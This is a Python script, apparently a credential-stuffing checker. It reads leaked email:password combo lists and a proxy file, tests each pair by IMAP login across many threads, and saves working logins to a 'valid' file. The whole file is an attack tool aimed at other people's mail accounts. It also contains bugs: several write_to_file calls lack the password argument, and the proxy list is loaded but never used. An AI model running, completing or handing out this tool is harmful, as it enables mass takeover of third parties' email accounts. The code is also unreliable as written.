from utils.config import load_config
from utils.imap_utils import get_imap_server, validate_email
import threading

# Create a lock for thread safety
output_lock = threading.Lock()
processed_emails = set()

def load_processed_emails(valid_file="data/valid.txt", bad_file="data/bad.txt"):
    """Loads processed email:password combinations from valid.txt and bad.txt."""

    global processed_emails
    for filename in [valid_file, bad_file]:
        try:
            with open(filename, "r") as f:
                for line in f:
                    email, password = line.strip().split(":")
                    processed_emails.add(f"{email}:{password}")
        except FileNotFoundError:
            pass  # Ignore if files don't exist
def load_proxy(proxy="data/proxy.txt"):
    proxy_list = []
    with open(proxy, "r") as f:
        for line in f:
            proxy_list.append(line)
    return proxy_list

def load_email_list(input_file="data/input.txt"):
    """Loads email:password combinations from the input file.

    Args:
        input_file (str): Path to the input file.

    Returns:
        list: A list of tuples, where each tuple is (email, password).
    """

    email_list = []
    with open(input_file, "r") as f:
        for line in f:
            parts = line.strip().split(":")
            email = parts[0]
            password = parts[1]  # Take the first password
            email_list.append((email, password))
    return email_list

def write_to_file(email, password, filename):
    """Writes an email address and password to the specified file.

    Args:
        email (str): The email address to write.
        password (str): The password to write.
        filename (str): The name of the file to write to.
    """

    with open(filename, "a") as f:
        f.write(f"{email}:{password}\n")


def process_email(email, password, config):
    """Processes a single email, including IMAP server lookup and validation."""

    imap_server = get_imap_server(email, config)

    if imap_server:
        is_valid = validate_email(email, password, imap_server, config)
        with output_lock:  # Acquire the lock before writing output
            if is_valid:
                print(f"Email {email} is VALID!")
                write_to_file(email, "data/valid.txt")
            else:
                print(f"Email {email} is INVALID!")
                write_to_file(email, "data/bad.txt")
    else:
        with output_lock:  # Acquire the lock before writing output
            print(f"Could not find IMAP server for {email}")
            write_to_file(email, "data/imapissue.txt")

def process_email_chunk(email_chunk, config):
    """Processes a chunk of email addresses."""
    global processed_emails  # Access the global set

    for email, password in email_chunk:
        if f"{email}:{password}" in processed_emails:
            print(f"Skipping duplicate: {email}:{password}")
            continue
        processed_emails.add(f"{email}:{password}")
        imap_server = get_imap_server(email, config)

        if imap_server:
            is_valid = validate_email(email, password, imap_server, config, output_lock)
            with output_lock:  # Acquire the lock before writing output
                if is_valid:
                    print(f"Email {email} is VALID!")
                    write_to_file(email,password, "data/valid.txt")
                else:
                    print(f"Email {email} is INVALID!")
                    write_to_file(email, password,"data/bad.txt")
        else:
            with output_lock:  # Acquire the lock before writing output
                print(f"Could not find IMAP server for {email}")
                write_to_file(email, "data/imapissue.txt")

def chunkify(lst, n):
    """Divides a list into n chunks."""
    return [lst[i::n] for i in range(n)]

if __name__ == "__main__":
    config = load_config()
    email_list = load_email_list()
    load_processed_emails()
    load_proxy()
    
    num_threads = config["threads"]
    email_chunks = chunkify(email_list, num_threads)

    threads = []
    for email_chunk in email_chunks:
        thread = threading.Thread(target=process_email_chunk, args=(email_chunk, config))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("Email checking completed!")